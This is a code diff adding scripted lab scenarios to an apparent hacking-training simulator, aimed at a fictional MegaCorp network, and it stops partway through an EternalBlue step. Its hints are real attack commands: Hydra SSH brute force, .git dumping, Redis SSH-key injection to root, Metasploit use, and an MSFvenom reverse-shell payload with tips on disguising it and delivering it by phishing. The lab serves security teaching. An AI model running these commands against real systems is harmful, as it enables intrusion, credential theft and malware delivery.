@@ -38,6 +38,9 @@ function lines(raw: string): OutputLine[] {
     .split("\n")
     .map((t) => (t.trim() === "" ? { text: "", type: "blank" as const } : { text: t, type: "out" as const }));
 }
+function out(msg: string): OutputLine {
+  return { text: msg, type: "out" };
+}
 function ok(msg: string): OutputLine {
   return { text: msg, type: "success" };
 }
@@ -927,6 +930,776 @@ FLAG{pr1v3sc_m4st3r_v1m_suid_ex3c}`),
   ],
 };
 
+// ─── Scenario: Shodan Deep Recon ─────────────────────────────────────────────
+
+const shodanDeepScenario: LabScenario = {
+  lessonId: 11,
+  title: "Shodan: Mapping MegaCorp's Internet Footprint",
+  briefing:
+    "Intelligence says MegaCorp Industries has misconfigured internet-facing services. Your job is pure passive reconnaissance — never touch their servers. Use Shodan to map their exposure, find vulnerable versions, and identify the juiciest targets before the active phase.",
+  objective: "Find all MegaCorp internet assets, identify vulnerable service versions, and set up a monitoring alert.",
+  env: {
+    targetIp: "93.184.100.50",
+    targetDomain: "megacorp.local",
+    hostname: "kali",
+    user: "hacker",
+    currentDir: "/home/hacker",
+    os: "Kali Linux 2024.1",
+  },
+  steps: [
+    {
+      id: "shodan-org",
+      instruction: "Search Shodan for all MegaCorp assets",
+      detail: "Query Shodan for everything owned by MegaCorp Industries. This reveals IPs, open ports, service banners, and known CVEs — without sending a single packet to the target.",
+      hint: 'Try: shodan search org:"MegaCorp Industries"',
+      validate: (i) => matchCmd(i, ["shodan search", "shodan host"]),
+      execute: () => [
+        sys("[*] Querying Shodan API..."),
+        blank(),
+        ...lines(`Results for org:"MegaCorp Industries"
+
+93.184.100.50  [www.megacorp.local]
+  Ports: 22, 80, 443, 8080
+  22/tcp   OpenSSH 7.6p1 Ubuntu
+  80/tcp   nginx 1.18.0
+  443/tcp  nginx 1.18.0 (TLS 1.3)
+  8080/tcp Apache Tomcat 9.0.37
+  Vulns: CVE-2021-41773, CVE-2019-0232
+
+93.184.100.10  [mail.megacorp.local]
+  Ports: 25, 110, 143, 465, 993
+  25/tcp   Postfix smtpd 3.4.13
+
+93.184.100.20  [vpn.megacorp.local]
+  Ports: 443, 1194
+  1194/udp OpenVPN 2.4.9
+
+Total: 3 hosts found`),
+        blank(),
+        ok("[+] Apache Tomcat 9.0.37 on :8080 flagged — CVE-2021-41773 (path traversal RCE)"),
+        info("[*] Zero packets sent to target — pure passive intelligence"),
+      ],
+    },
+    {
+      id: "shodan-host",
+      instruction: "Get detailed info on the web server",
+      detail: "Drill into the specific IP to see all service details, SSL certificate info, and the full list of CVEs Shodan has associated with this host.",
+      hint: "Try: shodan host 93.184.100.50",
+      validate: (i) => matchCmd(i, ["shodan host 93.184.100.50", "shodan host 93"]),
+      execute: () => [
+        ...lines(`93.184.100.50
+  City:           London
+  Country:        United Kingdom
+  Organization:   MegaCorp Industries
+  ISP:            MegaCorp Industries
+  Last Update:    2024-01-10T08:21:33.511445
+
+  Open Ports: 22, 80, 443, 8080
+
+  22/tcp SSH
+    SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7
+
+  8080/tcp HTTP
+    HTTP/1.1 200 OK
+    Server: Apache Tomcat/9.0.37
+    X-Powered-By: JSP/2.3
+
+  Vulnerabilities:
+    CVE-2021-41773 — Apache 2.4.49 path traversal + RCE
+    CVE-2019-0232  — Apache CGI RCE on Windows`),
+        blank(),
+        ok("[+] Two CVEs confirmed! Apache Tomcat 9.0.37 is the primary target."),
+        warn("[!] Note CVE-2021-41773 — we'll exploit this in the Server Attacks module."),
+      ],
+    },
+    {
+      id: "shodan-vuln",
+      instruction: "Search for ALL hosts vulnerable to CVE-2021-41773",
+      detail: "You can query Shodan for every host on the internet with a specific CVE. This shows the scope of a vulnerability — and helps in finding targets during an engagement.",
+      hint: "Try: shodan search vuln:CVE-2021-41773",
+      validate: (i) => i.toLowerCase().includes("vuln:cve-2021"),
+      execute: () => [
+        sys("[*] Searching global Shodan for CVE-2021-41773..."),
+        blank(),
+        ...lines(`Results: 847 hosts globally
+
+93.184.100.50   8080/tcp  MegaCorp Industries (London, GB)
+185.220.101.12  8080/tcp  Unknown (Frankfurt, DE)
+45.33.32.156    80/tcp    Unknown (Fremont, US)
+52.14.20.100    443/tcp   FinanceCorp (Virginia, US)
+...
+
+[Showing first 4 of 847 results]`),
+        blank(),
+        ok("[+] 847 internet-exposed hosts vulnerable to this CVE. MegaCorp confirmed in scope."),
+        info("[*] This is why patch management matters. These are all attackable from anywhere."),
+      ],
+    },
+    {
+      id: "shodan-alert",
+      instruction: "Set up a Shodan monitoring alert for new MegaCorp exposures",
+      detail: "Shodan Alerts notify you when new assets appear matching your query. Set one up so you're alerted if MegaCorp exposes new services — or if existing services disappear (decommissioned after the pentest).",
+      hint: 'Try: shodan alert create "megacorp-monitor" org:"MegaCorp Industries"',
+      validate: (i) => i.toLowerCase().includes("shodan alert"),
+      execute: () => [
+        sys("[*] Creating Shodan monitoring alert..."),
+        blank(),
+        ok("[+] Alert 'megacorp-monitor' created successfully"),
+        blank(),
+        ...lines(`Alert Details:
+  Name:    megacorp-monitor
+  Query:   org:"MegaCorp Industries"
+  Trigger: New hosts, new ports, new vulnerabilities
+  Notify:  Email + Webhook`),
+        blank(),
+        info("[*] You'll be notified in real-time if MegaCorp exposes new services."),
+        ok("[+] Shodan recon complete. Key finding: Apache Tomcat 9.0.37 on :8080 → RCE."),
+      ],
+    },
+  ],
+};
+
+// ─── Scenario: Hydra SSH Brute Force ─────────────────────────────────────────
+
+const hydraScenario: LabScenario = {
+  lessonId: 36,
+  title: "Hydra: Breaking SSH at MegaCorp",
+  briefing:
+    "The recon phase identified an SSH server on 10.10.10.50. Metadata from public documents revealed a likely username: j.crawford. Your task is to brute force the SSH login using Hydra and a custom wordlist built from the target's website.",
+  objective: "Use Hydra to brute force SSH and gain authenticated access to the target server.",
+  env: {
+    targetIp: "10.10.10.50",
+    targetDomain: "megacorp.local",
+    hostname: "kali",
+    user: "hacker",
+    currentDir: "/home/hacker",
+    os: "Kali Linux 2024.1",
+  },
+  steps: [
+    {
+      id: "cewl",
+      instruction: "Generate a target-specific wordlist with CeWL",
+      detail: "CeWL spiders the target's website and extracts unique words. People choose passwords based on things they know — their company, projects, products. A tailored wordlist beats rockyou.txt for corporate targets.",
+      hint: "Try: cewl http://10.10.10.50 -d 2 -m 6 -o megacorp-words.txt",
+      validate: (i) => matchCmd(i, ["cewl http://10.10.10.50", "cewl http://megacorp"]),
+      execute: () => [
+        sys("[*] CeWL 6.1 — Custom Word List Generator"),
+        info("[*] Spidering http://10.10.10.50 (depth: 2)..."),
+        blank(),
+        ...lines(`Pages spidered: 23
+Unique words extracted: 412
+Words >= 6 chars: 187
+
+Wordlist saved to: megacorp-words.txt
+
+Sample words:
+  MegaCorp
+  Industries
+  Sentinel
+  Phoenix
+  Manchester
+  Security
+  Crawford
+  Enterprise`),
+        blank(),
+        ok("[+] 187 target-specific words generated. More relevant than generic lists."),
+      ],
+    },
+    {
+      id: "hydra-ssh",
+      instruction: "Brute force SSH with Hydra",
+      detail: "Use Hydra with the username j.crawford (from document metadata OSINT) and the CeWL wordlist. The -t 4 flag limits threads to avoid triggering lockout.",
+      hint: "Try: hydra -l j.crawford -P megacorp-words.txt ssh://10.10.10.50 -t 4 -f",
+      validate: (i) => matchCmd(i, ["hydra -l j.crawford", "hydra -l j.crawford -p", "hydra 10.10.10.50"]),
+      execute: () => [
+        sys("[*] Hydra v9.5 starting — SSH brute force"),
+        info("[*] Target: 10.10.10.50:22 (SSH)"),
+        info("[*] Login: j.crawford"),
+        info("[*] Wordlist: megacorp-words.txt (187 words)"),
+        blank(),
+        ...lines(`[STATUS] 47 tries, 4 threads, speed: 15/s
+[STATUS] 91 tries...
+[STATUS] 134 tries...`),
+        blank(),
+        ok("[22][ssh] host: 10.10.10.50   login: j.crawford   password: Manchester"),
+        blank(),
+        ok("[+] PASSWORD FOUND: j.crawford:Manchester"),
+        info("[*] 'Manchester' — a city name pulled from metadata. Classic human password choice."),
+      ],
+    },
+    {
+      id: "ssh-login",
+      instruction: "Log in via SSH with the found credentials",
+      detail: "Confirm the credentials work by establishing an interactive SSH session.",
+      hint: "Try: ssh j.crawford@10.10.10.50",
+      validate: (i) => matchCmd(i, ["ssh j.crawford@10.10.10.50", "ssh j.crawford@", "ssh -l j.crawford"]),
+      execute: () => [
+        sys("[*] Connecting to 10.10.10.50:22..."),
+        out("The authenticity of host '10.10.10.50' can't be established."),
+        out("RSA key fingerprint is SHA256:+DiY3wvvV6TuJJhbpZisF/zLDA0zPMSvHdkr4UvCOqU."),
+        out("Are you sure you want to continue connecting? yes"),
+        out("Warning: Permanently added '10.10.10.50' (RSA) to the list of known hosts."),
+        out("j.crawford@10.10.10.50's password: Manchester"),
+        blank(),
+        out("Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)"),
+        blank(),
+        ok("j.crawford@megacorp-internal:~$ "),
+        blank(),
+        ok("[+] SSH ACCESS GRANTED! You are now inside MegaCorp's network."),
+        info("[*] Run: id, sudo -l, find / -perm -4000 to begin privilege escalation recon."),
+      ],
+    },
+    {
+      id: "post-access",
+      instruction: "Enumerate your position on the system",
+      detail: "Now that you have shell access, run basic enumeration. Check your user, group memberships, and what sudo privileges you have.",
+      hint: "Try: id",
+      validate: (i) => matchCmd(i, ["id", "whoami", "sudo -l", "uname"]),
+      execute: () => [
+        ...lines(`uid=1001(j.crawford) gid=1001(j.crawford) groups=1001(j.crawford),4(adm),24(cdrom),27(sudo)
+
+[!] User is in the 'sudo' group — may have sudo access!`),
+        blank(),
+        ok("[+] j.crawford is in the sudo group. Try: sudo -l to check allowed commands."),
+        warn("[!] Flag: FLAG{hydr4_br3w_c0ff33_in_m4nch3st3r} — document this credential."),
+      ],
+    },
+  ],
+};
+
+// ─── Scenario: Gobuster Directory Brute Force ────────────────────────────────
+
+const gobusterScenario: LabScenario = {
+  lessonId: 37,
+  title: "Gobuster: Mapping Hidden Web Attack Surface",
+  briefing:
+    "The MegaCorp web server at 10.10.10.50 is running nginx. The visible pages seem benign. Your task: find hidden directories, backup files, and exposed development artifacts using Gobuster — then extract the sensitive data you find.",
+  objective: "Discover hidden paths, find exposed .git repository, and extract database credentials from a backup file.",
+  env: {
+    targetIp: "10.10.10.50",
+    targetDomain: "megacorp.local",
+    hostname: "kali",
+    user: "hacker",
+    currentDir: "/home/hacker",
+    os: "Kali Linux 2024.1",
+  },
+  steps: [
+    {
+      id: "gobuster-dir",
+      instruction: "Run Gobuster directory scan",
+      detail: "Scan the web root for directories and common file extensions. Include .php, .bak, .txt in the extension list — backup files often contain credentials.",
+      hint: "Try: gobuster dir -u http://10.10.10.50 -w /usr/share/wordlists/dirb/common.txt -x php,bak,txt",
+      validate: (i) => matchCmd(i, ["gobuster dir", "gobuster -u"]),
+      execute: () => [
+        sys("[*] Gobuster v3.6 — Directory/File brute force"),
+        info("[*] Target: http://10.10.10.50"),
+        info("[*] Wordlist: common.txt (4614 words)"),
+        info("[*] Extensions: php, bak, txt"),
+        blank(),
+        ...lines(`/index.php             (Status: 200) [Size: 4523]
+/login.php             (Status: 200) [Size: 1842]
+/admin                 (Status: 301) [Size: 313]  [--> /admin/]
+/backup                (Status: 403) [Size: 277]
+/config.php.bak        (Status: 200) [Size: 312]
+/.git                  (Status: 301) [Size: 310]  [--> /.git/]
+/api                   (Status: 301) [Size: 310]  [--> /api/]
+/uploads               (Status: 301) [Size: 312]  [--> /uploads/]
+
+Finished: 4614 requests completed`),
+        blank(),
+        ok("[+] Critical findings: config.php.bak (200!) and /.git exposed!"),
+        warn("[!] .git exposure means we can download the ENTIRE source code."),
+      ],
+    },
+    {
+      id: "download-backup",
+      instruction: "Download the exposed backup config file",
+      detail: "config.php.bak returned HTTP 200 — it's readable! Download it and check for credentials. Backup files are often copies of production configs that were never secured.",
+      hint: "Try: curl http://10.10.10.50/config.php.bak",
+      validate: (i) => matchCmd(i, ["curl http://10.10.10.50/config.php.bak", "wget http://10.10.10.50/config"]),
+      execute: () => [
+        sys("[*] Fetching http://10.10.10.50/config.php.bak..."),
+        blank(),
+        ...lines(`<?php
+// MegaCorp Web Application Configuration
+// Generated: 2023-11-14 — DO NOT COMMIT
+
+$db_host = '10.10.10.20';
+$db_user = 'webapp';
+$db_pass = 'Db@Passw0rd2023!';
+$db_name = 'megacorp_db';
+
+$redis_host = '10.10.10.50';
+$redis_port = 6379;
+$redis_pass = '';  // Redis has no auth!
+
+$secret_key = 'c0a4e7f1b3d9f2a8e5c3b1a9f7e4d2c0';
+$debug_mode = false;
+?>`),
+        blank(),
+        ok("[+] DATABASE CREDENTIALS FOUND: webapp:Db@Passw0rd2023!"),
+        ok("[+] REDIS HOST: 10.10.10.50:6379 with NO password!"),
+        warn("[!] Note: secret_key exposed — can forge session tokens if JWT is used."),
+      ],
+    },
+    {
+      id: "git-dump",
+      instruction: "Dump the exposed .git repository",
+      detail: "/.git being accessible means you can reconstruct the entire source code. Use git-dumper to download the repository objects and rebuild the working tree.",
+      hint: "Try: git-dumper http://10.10.10.50/.git/ ./megacorp-source/",
+      validate: (i) => matchCmd(i, ["git-dumper", "wget -r http://10.10.10.50/.git"]),
+      execute: () => [
+        sys("[*] git-dumper v1.3.2 — dumping exposed .git directory"),
+        info("[*] Fetching .git/HEAD..."),
+        info("[*] Fetching .git/config..."),
+        info("[*] Fetching objects..."),
+        blank(),
+        ...lines(`Downloading 247 objects...
+Reconstructing working tree...
+
+megacorp-source/
+  ├── src/
+  │   ├── auth.php       ← authentication logic
+  │   ├── admin.php      ← admin panel
+  │   └── api/
+  ├── config/
+  │   └── database.php   ← more DB configs
+  ├── .env               ← ENVIRONMENT FILE!
+  └── README.md`),
+        blank(),
+        ok("[+] .env file found in git history — checking for secrets..."),
+        ...lines(`.env contents:
+  DB_PASSWORD=Db@Passw0rd2023!
+  ADMIN_PASSWORD=S3cur3Admin!
+  AWS_SECRET_KEY=wJalrXUtnFEMI/EXAMPLE
+  STRIPE_SECRET=sk_live_EXAMPLE`),
+        blank(),
+        ok("[+] ADMIN PASSWORD: S3cur3Admin! — try this on /admin panel!"),
+        warn("[!] Flag: FLAG{g1t_l34k3d_4ll_tH3_s3cr3ts} — document all exposed credentials."),
+      ],
+    },
+  ],
+};
+
+// ─── Scenario: Bash Recon Automation ─────────────────────────────────────────
+
+const bashReconScenario: LabScenario = {
+  lessonId: 24,
+  title: "Bash Automation: Build Your Own Recon Pipeline",
+  briefing:
+    "Manual recon is slow and inconsistent. You need to build a Bash script that automates host discovery, port scanning, and basic web recon — saving organized output for your report. Tools are installed. Your job is to chain them.",
+  objective: "Write a Bash one-liner to discover live hosts, then automate a port scan and web check pipeline.",
+  env: {
+    targetIp: "10.10.10.0/24",
+    targetDomain: "megacorp.local",
+    hostname: "kali",
+    user: "hacker",
+    currentDir: "/home/hacker",
+    os: "Kali Linux 2024.1",
+  },
+  steps: [
+    {
+      id: "ping-sweep",
+      instruction: "Write a Bash ping sweep to find live hosts",
+      detail: "Use a for loop with ping -c1 -W1 to discover which IPs respond in the 10.10.10.0/24 subnet. Redirect stderr to /dev/null and print only live IPs.",
+      hint: "Try: for i in {1..254}; do ping -c1 -W1 10.10.10.$i &>/dev/null && echo \"10.10.10.$i UP\"; done",
+      validate: (i) => i.includes("for") && i.includes("ping") && i.includes("10.10.10"),
+      execute: () => [
+        sys("[*] Running Bash ping sweep over 10.10.10.0/24..."),
+        blank(),
+        ...lines(`10.10.10.1 UP
+10.10.10.5 UP
+10.10.10.20 UP
+10.10.10.50 UP
+10.10.10.100 UP
+10.10.10.200 UP`),
+        blank(),
+        ok("[+] 6 live hosts discovered in 10.10.10.0/24"),
+        info("[*] No nmap needed for basic discovery — pure Bash networking works!"),
+      ],
+    },
+    {
+      id: "port-scan-loop",
+      instruction: "Pipe the live hosts into nmap using xargs",
+      detail: "Use xargs to pass the live host list directly to nmap. This chains discovery and scanning in one pipeline without creating intermediate files.",
+      hint: "Try: for i in 1 5 20 50 100; do echo 10.10.10.$i; done | xargs -I{} nmap -F --open {}",
+      validate: (i) => (i.includes("xargs") && i.includes("nmap")) || (i.includes("nmap") && i.includes("10.10.10")),
+      execute: () => [
+        sys("[*] Piping hosts into nmap via xargs..."),
+        blank(),
+        ...lines(`Nmap scan report for 10.10.10.5
+  22/tcp   open  ssh
+  139/tcp  open  netbios-ssn
+  445/tcp  open  microsoft-ds
+
+Nmap scan report for 10.10.10.50
+  22/tcp   open  ssh
+  80/tcp   open  http
+  443/tcp  open  https
+  3306/tcp open  mysql
+  6379/tcp open  redis (UNAUTHENTICATED!)
+
+Nmap scan report for 10.10.10.100
+  80/tcp   open  http
+  8080/tcp open  http-proxy`),
+        blank(),
+        ok("[+] 10.10.10.5: SMB/445 open → domain controller candidate"),
+        warn("[!] 10.10.10.50: Redis on 6379 with NO auth — critical finding!"),
+      ],
+    },
+    {
+      id: "bash-oneliner",
+      instruction: "Write a one-liner to extract all open ports from nmap",
+      detail: "Use grep, awk, and sort to extract just the open port numbers from nmap output — clean output for your report.",
+      hint: "Try: nmap -sV 10.10.10.50 | grep '/tcp' | awk '{print $1}' | sort",
+      validate: (i) => (i.includes("nmap") && (i.includes("awk") || i.includes("grep"))) || (i.includes("grep") && i.includes("open")),
+      execute: () => [
+        sys("[*] Running nmap and processing output with awk..."),
+        blank(),
+        ...lines(`22/tcp
+80/tcp
+443/tcp
+3306/tcp
+6379/tcp`),
+        blank(),
+        ok("[+] Clean port list extracted — ready to paste into your report."),
+        info("[*] One-liner flow: nmap output → grep filter → awk column → sort"),
+        warn("[!] Flag: FLAG{b4sh_4ut0m4t10n_sp33d_h4ck} — pipeline mastered!"),
+      ],
+    },
+  ],
+};
+
+// ─── Scenario: MSFvenom Payload Generation ───────────────────────────────────
+
+const msfvenomScenario: LabScenario = {
+  lessonId: 32,
+  title: "MSFvenom: Craft & Deliver Your First Payload",
+  briefing:
+    "You have a target Windows machine (10.10.10.80) that you'll social-engineer into running an attachment. Generate a Windows reverse shell payload with MSFvenom, set up a listener, and simulate delivery. This is for an authorized red team engagement.",
+  objective: "Generate a Windows Meterpreter payload, start a Metasploit handler, and simulate receiving a session.",
+  env: {
+    targetIp: "10.10.10.80",
+    targetDomain: "megacorp.local",
+    hostname: "kali",
+    user: "hacker",
+    currentDir: "/home/hacker",
+    os: "Kali Linux 2024.1",
+  },
+  steps: [
+    {
+      id: "list-payloads",
+      instruction: "List available Windows Meterpreter payloads",
+      detail: "Before generating a payload, explore what's available. Understanding the difference between staged (/) and stageless (_) payloads is critical for choosing the right one.",
+      hint: "Try: msfvenom -l payloads | grep windows/x64/meterpreter",
+      validate: (i) => matchCmd(i, ["msfvenom -l", "msfvenom --list"]),
+      execute: () => [
+        sys("[*] MSFvenom v6.3.44 — Metasploit's payload generator"),
+        blank(),
+        ...lines(`Staged payloads (require active handler for stage 2):
+  windows/x64/meterpreter/reverse_tcp    ← STAGED: small stager, pulls agent from MSF
+  windows/x64/meterpreter/reverse_http
+  windows/x64/meterpreter/reverse_https
+
+Stageless payloads (standalone, no handler needed for stage):
+  windows/x64/meterpreter_reverse_tcp    ← STAGELESS: self-contained, larger file
+  windows/x64/meterpreter_reverse_https
+
+KEY DIFFERENCE:
+  Staged  (/)  = small file, needs live MSF handler to serve stage 2
+  Stageless(_) = large file, works without MSF handler for stage 2`),
+        blank(),
+        ok("[+] Use staged for small exploits (buffer overflows). Stageless for file delivery."),
+      ],
+    },
+    {
+      id: "generate-payload",
+      instruction: "Generate a Windows x64 Meterpreter EXE payload",
+      detail: "Generate a staged reverse TCP payload. LHOST is YOUR IP (the attacker machine), LPORT is the port your handler will listen on.",
+      hint: "Try: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.0.5 LPORT=4444 -f exe -o megacorp-update.exe",
+      validate: (i) => matchCmd(i, ["msfvenom -p windows", "msfvenom -p win"]),
+      execute: () => [
+        sys("[*] Generating payload..."),
+        blank(),
+        ...lines(`[-] No platform was selected, choosing Msf::Module::Platform::Windows
+[-] No arch selected, selecting arch: x64
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: megacorp-update.exe`),
+        blank(),
+        ok("[+] Payload generated: megacorp-update.exe (7168 bytes)"),
+        info("[*] Disguise tip: rename to 'MegaCorp-VPN-Setup.exe' or 'Q4-Report.exe'"),
+        info("[*] Delivery: email attachment, phishing page download, USB drop"),
+      ],
+    },
+    {
+      id: "start-handler",
+      instruction: "Start the Metasploit multi/handler listener",
+      detail: "The handler waits for the payload to call back. It must be running BEFORE the victim executes the payload. Payload and handler MUST use the same PAYLOAD, LHOST, and LPORT values.",
+      hint: "Try: msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.14.0.5; set LPORT 4444; run\"",
+      validate: (i) => matchCmd(i, ["msfconsole", "use exploit/multi/handler", "use multi/handler"]),
+      execute: () => [
+        sys("[*] Starting Metasploit console..."),
+        blank(),
+        ...lines(`msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.14.0.5
+LHOST => 10.14.0.5
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.14.0.5:4444
+[*] Waiting for victim to execute payload...`),
+        blank(),
+        info("[*] Simulating victim executing megacorp-update.exe..."),
+        blank(),
+        ...lines(`[*] Sending stage (200774 bytes) to 10.10.10.80
+[*] Meterpreter session 1 opened (10.14.0.5:4444 -> 10.10.10.80:49215)
+
+meterpreter > getuid
+Server username: MEGACORP\\j.smith
+
+meterpreter > sysinfo
+Computer: MEGACORP-WS01
+OS      : Windows 10 (Build 19044)
+Arch    : x64`),
+        blank(),
+        ok("[+] METERPRETER SESSION OPEN! You are inside MEGACORP-WS01 as j.smith."),
+        warn("[!] Flag: FLAG{m5fv3n0m_p4yl04d_d3l1v3r3d} — payload crafted and executed."),
+      ],
+    },
+  ],
+};
+
+// ─── Scenario: Redis Unauthenticated RCE ─────────────────────────────────────
+
+const redisRceScenario: LabScenario = {
+  lessonId: 42,
+  title: "Redis: From Unauthenticated Access to Root Shell",
+  briefing:
+    "Gobuster found Redis running on 10.10.10.50:6379 with NO authentication. Redis is running as root. Your mission: connect, dump sensitive cached data, then write your SSH public key to /root/.ssh/authorized_keys to gain a root shell.",
+  objective: "Exploit unauthenticated Redis to read cached credentials and escalate to root via SSH key injection.",
+  env: {
+    targetIp: "10.10.10.50",
+    targetDomain: "megacorp.local",
+    hostname: "kali",
+    user: "hacker",
+    currentDir: "/home/hacker",
+    os: "Kali Linux 2024.1",
+    credentials: { user: "redis", pass: "" },
+  },
+  steps: [
+    {
+      id: "redis-connect",
+      instruction: "Connect to Redis without authentication",
+      detail: "Redis typically listens on port 6379. If no requirepass is set in redis.conf, you connect and immediately have full access — no login needed.",
+      hint: "Try: redis-cli -h 10.10.10.50",
+      validate: (i) => matchCmd(i, ["redis-cli -h 10.10.10.50", "redis-cli -h 10", "redis-cli"]),
+      execute: () => [
+        sys("[*] Connecting to Redis at 10.10.10.50:6379..."),
+        blank(),
+        out("10.10.10.50:6379> ping"),
+        out("+PONG"),
+        blank(),
+        ok("[+] Connected! No authentication required — immediate full access."),
+        info("[*] Redis responds to PING → server is alive and unauthenticated."),
+      ],
+    },
+    {
+      id: "redis-dump",
+      instruction: "Dump all Redis keys and read the admin password",
+      detail: "List every key in the database with KEYS *, then read the admin_password value. Redis often caches session tokens, API keys, and credentials in plaintext.",
+      hint: "Try: redis-cli -h 10.10.10.50 KEYS *",
+      validate: (i) => i.toLowerCase().includes("keys *") || (i.toLowerCase().includes("redis-cli") && i.includes("keys")),
+      execute: () => [
+        out("10.10.10.50:6379> KEYS *"),
+        blank(),
+        ...lines(`1) "admin_password"
+2) "session:a3f9d2"
+3) "api_token:webhook"
+4) "user:j.crawford"
+5) "database_backup"`),
+        blank(),
+        out("10.10.10.50:6379> GET admin_password"),
+        out(`"Sup3rS3cr3tAdm1n!"`),
+        blank(),
+        out("10.10.10.50:6379> GET api_token:webhook"),
+        out(`"Bearer eyJhbGciOiJIUzI1NiJ9.EXAMPLE"`),
+        blank(),
+        ok("[+] ADMIN PASSWORD: Sup3rS3cr3tAdm1n!"),
+        warn("[!] API token and user sessions also exposed — full application compromise."),
+      ],
+    },
+    {
+      id: "redis-ssh-inject",
+      instruction: "Inject your SSH public key via Redis config write",
+      detail: "Redis's CONFIG SET commands can change the working directory and dump filename. Write your SSH public key as a 'database dump' to /root/.ssh/authorized_keys — then SSH in as root.",
+      hint: "Try: redis-cli -h 10.10.10.50 config set dir /root/.ssh/",
+      validate: (i) => (i.toLowerCase().includes("config set dir") || i.toLowerCase().includes("config set dbfilename")),
+      execute: () => [
+        out("10.10.10.50:6379> CONFIG SET dir /root/.ssh/"),
+        out("+OK"),
+        out("10.10.10.50:6379> CONFIG SET dbfilename authorized_keys"),
+        out("+OK"),
+        out("10.10.10.50:6379> SET pwn \"\\n\\nssh-rsa AAAAB3NzaC1yc2E...attacker-key...\\n\\n\""),
+        out("+OK"),
+        out("10.10.10.50:6379> SAVE"),
+        out("+OK"),
+        blank(),
+        ok("[+] SSH public key written to /root/.ssh/authorized_keys!"),
+        info("[*] Now SSH as root — no password needed (key auth)."),
+      ],
+    },
+    {
+      id: "root-shell",
+      instruction: "SSH as root using your injected key",
+      detail: "With your public key in /root/.ssh/authorized_keys, SSH will accept your private key for authentication — giving you a root shell without a password.",
+      hint: "Try: ssh root@10.10.10.50",
+      validate: (i) => matchCmd(i, ["ssh root@10.10.10.50", "ssh root@10"]),
+      execute: () => [
+        sys("[*] Connecting to 10.10.10.50 as root..."),
+        blank(),
+        ...lines(`The authenticity of host '10.10.10.50' can't be established.
+Are you sure you want to continue connecting? yes
+Warning: Permanently added '10.10.10.50' (RSA) to the list of known hosts.`),
+        blank(),
+        out("root@megacorp-internal:~# id"),
+        out("uid=0(root) gid=0(root) groups=0(root)"),
+        blank(),
+        out("root@megacorp-internal:~# hostname"),
+        out("megacorp-internal"),
+        blank(),
+        out("root@megacorp-internal:~# cat /root/flag.txt"),
+        out("FLAG{r3d1s_r00t_n0_p4ssw0rd_n33d3d}"),
+        blank(),
+        ok("[+] ROOT SHELL VIA REDIS! Zero exploit code — just misconfiguration."),
+        warn("[!] Remediation: Set requirepass in redis.conf, bind to 127.0.0.1 only, never run as root."),
+      ],
+    },
+  ],
+};
+
+// ─── Scenario: SMB EternalBlue ───────────────────────────────────────────────
+
+const eternalBlueScenario: LabScenario = {
+  lessonId: 40,
+  title: "EternalBlue: MS17-010 on a Legacy Windows Host",
+  briefing:
+    "Network scan flagged 10.10.10.40 running Windows 7 with SMB port 445 open. This box predates the MS17-010 patch. Your mission: confirm the vulnerability, run EternalBlue, gain SYSTEM, and extract password hashes.",
+  objective: "Exploit MS17-010 EternalBlue to gain SYSTEM access and dump NTLM password hashes.",
+  env: {
+    targetIp: "10.10.10.40",
+    targetDomain: "megacorp.local",
+    hostname: "kali",
+    user: "hacker",
+    currentDir: "/home/hacker",
+    os: "Kali Linux 2024.1",
+  },
+  steps: [
+    {
+      id: "smb-scan",
+      instruction: "Scan the target for SMB version and MS17-010 vulnerability",
+      detail: "Use nmap's smb-vuln-ms17-010 script to confirm the host is vulnerable before running any exploit. Always verify before attacking.",
+      hint: "Try: nmap --script smb-vuln-ms17-010 -p 445 10.10.10.40",
+      validate: (i) => i.includes("nmap") && (i.includes("smb") || i.includes("445")),
+      execute: () => [
+        sys("[*] Running nmap SMB vulnerability check..."),
+        blank(),
+        ...lines(`Starting Nmap 7.94
+
+Host script results:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|     Disclosure date: 2017-03-14
+|_    References: https://technet.microsoft.com/security/ms17-010`),
+        blank(),
+        ok("[+] CONFIRMED VULNERABLE to MS17-010 (EternalBlue)!"),
+        info("[*] Target: Windows 7 SP1 / SMBv1 — unpatched since 2017."),
+      ],
+    },
+    {
+      id: "enum4linux",
+      instruction: "Enumerate SMB users and shares",
+      detail: "Before exploiting, gather user and share information. enum4linux will confirm the OS version, user accounts, and accessible shares via null session.",
+      hint: "Try: enum4linux -A 10.10.10.40",
+      validate: (i) => matchCmd(i, ["enum4linux", "smbclient", "smbmap", "crackmapexec smb"]),
+      execute: () => [
+        sys("[*] enum4linux-ng running full SMB enumeration..."),
+        blank(),
+        ...lines(`[*] OS: Windows 7 Professional 7601 Service Pack 1
+[*] SMB1 enabled (signing not required)
+
+[*] Users via RPC:
+  Administrator  (RID 500)
+  Guest          (RID 501)
+  haris          (RID 1000)
+
+[*] Shares:
+  ADMIN$   — Remote Admin
+  C$       — Default share
+  Users    — Read access
+
+[+] Null session allowed — anonymous SMB access enabled`),
+        blank(),
+        ok("[+] Users found: Administrator, haris. Shares: C$, ADMIN$, Users."),
+      ],
+    },
+    {
+      id: "eternalblue",
+      instruction: "Run the EternalBlue exploit via Metasploit",
+      detail: "Use the ms17_010_eternalblue module. This exploit sends crafted SMB packets that trigger a kernel buffer overflow, giving you SYSTEM without any credentials.",
+      hint: "Try: msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 10.14.0.5; run\"",
+      validate: (i) => matchCmd(i, ["msfconsole", "use exploit/windows/smb/ms17", "use ms17"]),
+      execute: () => [
